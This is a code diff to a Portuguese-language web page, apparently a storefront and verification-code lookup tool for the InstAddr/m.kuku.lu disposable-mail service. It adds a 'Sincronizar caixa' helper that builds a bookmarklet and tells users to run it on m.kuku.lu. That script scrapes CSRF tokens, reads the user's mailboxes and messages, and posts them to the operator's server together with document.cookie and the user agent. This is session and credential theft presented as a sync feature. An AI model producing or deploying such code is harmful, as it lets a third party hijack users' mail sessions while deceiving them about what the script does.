@@ -965,6 +965,96 @@
       background: linear-gradient(135deg, rgba(80,10,10,0.5), rgba(60,5,5,0.4));
       border: 1px solid rgba(252,165,165,0.3);
     }
+    .instaddr-sync-actions {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      margin-top: 14px;
+    }
+    .btn-secondary {
+      width: 100%;
+      max-width: 380px;
+      padding: 12px 18px;
+      border-radius: 12px;
+      border: 1px solid var(--border-gold);
+      background: linear-gradient(135deg, rgba(14,116,144,0.92), rgba(30,64,175,0.92));
+      color: #fff;
+      font-family: 'Cinzel', serif;
+      font-size: 0.84rem;
+      letter-spacing: 1px;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(30,64,175,0.25);
+    }
+    .btn-secondary:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 28px rgba(30,64,175,0.35);
+    }
+    .instaddr-sync-status {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      text-align: center;
+      max-width: 560px;
+      line-height: 1.45;
+    }
+    .instaddr-sync-status.ok { color: #86efac; }
+    .instaddr-sync-status.warn { color: var(--gold-light); }
+    .sync-helper-card {
+      margin-top: 14px;
+      border: 1px dashed var(--border-gold);
+      border-radius: 14px;
+      padding: 14px;
+      background: rgba(10, 0, 20, 0.35);
+      text-align: left;
+    }
+    .sync-helper-card h3 {
+      font-family: 'Cinzel', serif;
+      color: var(--gold-light);
+      font-size: 0.95rem;
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .sync-helper-card ol {
+      padding-left: 18px;
+      color: var(--text-white);
+      line-height: 1.6;
+      font-size: 0.9rem;
+    }
+    .sync-helper-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 12px;
+    }
+    .sync-helper-actions a,
+    .sync-helper-actions button {
+      text-decoration: none;
+      min-width: 210px;
+      text-align: center;
+    }
+    .sync-script-box {
+      width: 100%;
+      min-height: 108px;
+      margin-top: 12px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px dashed var(--border-gold);
+      background: rgba(10, 0, 20, 0.65);
+      color: var(--gold-light);
+      font-family: monospace;
+      font-size: 0.8rem;
+      line-height: 1.45;
+      resize: vertical;
+    }
+    .sync-helper-note {
+      margin-top: 8px;
+      font-size: 0.76rem;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.5;
+    }
 
     .result-emoji { font-size: 2.5rem; margin-bottom: 10px; display: block; }
 
@@ -1226,6 +1316,11 @@
       <button class="btn-primary" id="btn-buscar" onclick="buscarCodigo()">
         ✦ Buscar Código
       </button>
+
+      <div id="instaddr-sync-actions" class="instaddr-sync-actions" style="display:none">
+        <button class="btn-secondary" type="button" onclick="openKukuSyncHelp()">🔄 Sincronizar caixa do InstAddr</button>
+        <div class="instaddr-sync-status" id="instaddr-sync-status"></div>
+      </div>
 
       <!-- Resultado -->
       <div class="result-box" id="result-box">
@@ -2440,6 +2535,196 @@
       box.className = 'result-box';
     }
 
+    function isInstaddrSite() {
+      const host = (window.location.hostname || '').toLowerCase();
+      return host.includes('instaddr');
+    }
+
+    function setInstaddrSyncStatus(message, kind) {
+      const el = document.getElementById('instaddr-sync-status');
+      if (!el) return;
+      el.textContent = message || '';
+      el.className = 'instaddr-sync-status ' + (kind || '');
+    }
+
+    async function refreshInstaddrSyncStatus() {
+      if (!isInstaddrSite()) return;
+      try {
+        const r = await fetch('/api/instaddr/browser-session');
+        const j = await r.json();
+        if (j && j.configured) {
+          setInstaddrSyncStatus('✅ Sessão Kuku sincronizada. Se um email novo acabou de chegar, sincronize a caixa novamente antes de buscar.', 'ok');
+        } else {
+          setInstaddrSyncStatus('ℹ️ Se a consulta não localizar emails, use “Sincronizar caixa do InstAddr” para importar a sua inbox do Kuku.', 'warn');
+        }
+      } catch (e) {
+        setInstaddrSyncStatus('ℹ️ Se a consulta falhar, sincronize a caixa do Kuku manualmente.', 'warn');
+      }
+    }
+
+    async function runKukuBrowserSync(apiBase) {
+      function extractMailboxes(raw) {
+        const out = [];
+        String(raw || '').split(/\r?\n/).slice(1).forEach(line => {
+          const data = line.replace(/"/g, '').split(',');
+          const addr = String((data[3] || data[0] || '')).trim().toLowerCase();
+          if (addr && addr.includes('@') && !out.includes(addr)) out.push(addr);
+        });
+        return out;
+      }
+      function pickText(doc, selectors) {
+        for (const sel of selectors) {
+          const el = doc.querySelector(sel);
+          const txt = el ? String(el.textContent || '').trim() : '';
+          if (txt) return txt;
+        }
+        return '';
+      }
+      try {
+        if (!/kuku\.lu$/i.test(location.hostname || '')) {
+          alert('Abra a caixa no m.kuku.lu antes de sincronizar.');
+          return;
+        }
+        const html = document.documentElement ? document.documentElement.innerHTML : '';
+        const csrf = (html.match(/csrf_token_check=([A-Za-z0-9_-]+)/) || [])[1] || '';
+        const csrfSub = (html.match(/csrf_subtoken_check=([A-Za-z0-9_-]+)/) || [])[1] || '';
+        if (!csrf) {
+          alert('Não consegui localizar o token do Kuku. Recarregue a página da inbox e tente novamente.');
+          return;
+        }
+        const addrResp = await fetch('/datagen.php?action=getAddrList', { credentials: 'include' });
+        const addrText = await addrResp.text();
+        let mailboxes = extractMailboxes(addrText);
+        const visibleEmails = (document.body && document.body.innerText ? document.body.innerText.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/ig) : []) || [];
+        visibleEmails.map(v => String(v || '').trim().toLowerCase()).forEach(v => {
+          if (v && !mailboxes.includes(v)) mailboxes.push(v);
+        });
+        mailboxes = mailboxes.slice(0, 12);
+        if (!mailboxes.length) {
+          alert('Nenhuma caixa foi localizada nessa sessão do Kuku.');
+          return;
+        }
+        const mails = [];
+        for (const mailbox of mailboxes) {
+          const qs = new URLSearchParams({ q: mailbox, nopost: '1', csrf_token_check: csrf });
+          if (csrfSub) qs.set('csrf_subtoken_check', csrfSub);
+          const listResp = await fetch('/recv._ajax.php?' + qs.toString(), { credentials: 'include' });
+          const listHtml = await listResp.text();
+          const entries = [...listHtml.matchAll(/openMailData\(['"]?(\d+)['"]?,\s*['"]?([a-f0-9]+)['"]?/ig)].slice(-20);
+          for (const entry of entries) {
+            const num = entry[1];
+            const key = entry[2];
+            const viewResp = await fetch('/smphone.app.recv.view.php', {
+              method: 'POST',
+              credentials: 'include',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+              body: new URLSearchParams({ num, key, noscroll: '1' }).toString(),
+            });
+            const viewHtml = await viewResp.text();
+            const doc = new DOMParser().parseFromString(viewHtml, 'text/html');
+            const subject = pickText(doc, ['.full', 'title', 'h1', 'h2']) || 'Sem assunto';
+            const fromText = pickText(doc, ['.from', '.mailfrom', '[class*="from"]', '.sender', '.frm']);
+            const bodyHtml = (doc.body && doc.body.innerHTML) ? doc.body.innerHTML : viewHtml;
+            mails.push({
+              to: mailbox,
+              from: fromText,
+              subject: subject,
+              body: bodyHtml,
+              received_at: Math.floor(Date.now() / 1000),
+              source: 'browser-sync'
+            });
+          }
+        }
+        const payload = {
+          cookie_header: document.cookie || '',
+          page_url: location.href,
+          user_agent: navigator.userAgent || '',
+          csrf_check: csrf,
+          csrf_subtoken_check: csrfSub,
+          mails
+        };
+        const resp = await fetch(String(apiBase || '').replace(/\/$/, '') + '/api/instaddr/browser-sync-mails', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+          body: new URLSearchParams({ payload: JSON.stringify(payload) }).toString(),
+        });
+        const text = await resp.text();
+        let data = {};
+        try { data = JSON.parse(text); } catch (e) {}
+        if (data && data.success) {
+          alert('Sincronização concluída: ' + (data.imported_count || mails.length || 0) + ' email(s) importado(s). Volte ao InstAddr e clique em Buscar Código.');
+        } else {
+          alert('A sincronização foi enviada, mas a resposta não confirmou sucesso. Volte ao InstAddr e tente buscar novamente.');
+        }
+      } catch (err) {
+        alert('Falha ao sincronizar a caixa: ' + (err && err.message ? err.message : err));
+      }
+    }
+
+    function buildKukuSyncBookmarklet() {
+      const apiBase = String(window.location.origin || '').replace(/\/$/, '');
+      return 'javascript:(' + runKukuBrowserSync.toString() + ')(' + JSON.stringify(apiBase) + ');void(0);';
+    }
+
+    function hydrateKukuSyncHelp() {
+      const ta = document.getElementById('kuku-sync-script');
+      if (ta) ta.value = buildKukuSyncBookmarklet();
+      const a = document.getElementById('kuku-sync-bookmarklet');
+      if (a) a.href = buildKukuSyncBookmarklet();
+    }
+
+    function selectKukuSyncScript() {
+      const ta = document.getElementById('kuku-sync-script');
+      if (!ta) return;
+      ta.focus();
+      ta.select();
+      showToast('✓ Script selecionado. Use Ctrl+C se quiser copiar.');
+    }
+
+    function openKukuSyncHelp() {
+      const box = document.getElementById('result-box');
+      box.className = 'result-box error';
+      box.innerHTML = `
+        <span class="result-emoji">📬</span>
+        <div class="error-title">Sincronizar caixa do Kuku</div>
+        <div class="error-msg">Se o servidor não conseguir entrar na sua caixa do InstAddr, importe os emails direto do seu navegador para liberar a consulta.</div>
+        <div class="sync-helper-card">
+          <h3>Como resolver</h3>
+          <ol>
+            <li>Abra sua caixa no <b>m.kuku.lu</b> e deixe os emails carregados.</li>
+            <li>Arraste o botão <b>⭐ Favorito de Sincronização</b> para a barra de favoritos do navegador.</li>
+            <li>Já dentro do <b>m.kuku.lu</b>, clique no favorito criado para importar os emails da caixa atual.</li>
+            <li>Volte para esta página e clique em <b>Buscar Código</b> novamente.</li>
+          </ol>
+          <div class="sync-helper-actions">
+            <a id="kuku-sync-bookmarklet" class="btn-primary" href="#">⭐ Favorito de Sincronização</a>
+            <a class="btn-secondary" href="https://m.kuku.lu/" target="_blank" rel="noopener noreferrer">🌐 Abrir m.kuku.lu</a>
+            <button class="btn-secondary" type="button" onclick="selectKukuSyncScript()">✂️ Selecionar script</button>
+          </div>
+          <textarea id="kuku-sync-script" class="sync-script-box" readonly onclick="this.focus();this.select();" onfocus="this.select()"></textarea>
+          <div class="sync-helper-note">Se preferir, copie o script acima, crie um favorito novo no navegador e cole esse conteúdo como URL do favorito. Depois clique no favorito dentro do m.kuku.lu.</div>
+        </div>
+      `;
+      box.style.display = 'block';
+      hydrateKukuSyncHelp();
+    }
+
+    function appendInstaddrSyncCta(box) {
+      if (!box || !isInstaddrSite()) return;
+      box.innerHTML += `
+        <div class="sync-helper-card">
+          <h3>Resolver consulta da caixa</h3>
+          <div style="text-align:center;color:var(--text-muted);line-height:1.6;font-size:0.9rem;">
+            O servidor não conseguiu ler a sua sessão do Kuku sozinho. Use a sincronização do navegador para importar os emails da caixa e repetir a busca.
+          </div>
+          <div class="sync-helper-actions">
+            <button class="btn-secondary" type="button" onclick="openKukuSyncHelp()">🔄 Sincronizar caixa do InstAddr</button>
+            <a class="btn-secondary" href="https://m.kuku.lu/" target="_blank" rel="noopener noreferrer">🌐 Abrir m.kuku.lu</a>
+          </div>
+        </div>
+      `;
+    }
+
     async function buscarCodigo() {
       const emailVal = document.getElementById('email-input').value.trim();
       const btn = document.getElementById('btn-buscar');
@@ -2692,13 +2977,17 @@
     function showError(msg, isHtml) {
       const box = document.getElementById('result-box');
       box.className = 'result-box error';
+      const rawMsg = String(msg || '');
       // Se a mensagem já vem com HTML formatado, não escapa
-      const safeMsg = isHtml ? msg : String(msg).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+      const safeMsg = isHtml ? msg : rawMsg.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
       box.innerHTML = `
         <span class="result-emoji">⚠️</span>
         <div class="error-title">Código não localizado</div>
         <div class="error-msg">${safeMsg}</div>
       `;
+      if (isInstaddrSite() && /caixa instaddr|sessionhash|cf_clearance|kuku/i.test(rawMsg.toLowerCase())) {
+        appendInstaddrSyncCta(box);
+      }
       box.style.display = 'block';
     }
 
@@ -3389,6 +3678,11 @@ Senha: ${escapeHtml(o.delivered_password)}</textarea>
       try { if (typeof loadProducts === 'function') loadProducts(); } catch(e){}
     }
     configureLojaStandalone();
+    if (isInstaddrSite()) {
+      const syncActions = document.getElementById('instaddr-sync-actions');
+      if (syncActions) syncActions.style.display = 'flex';
+      refreshInstaddrSyncStatus();
+    }
   </script>
 </body>
 </html>
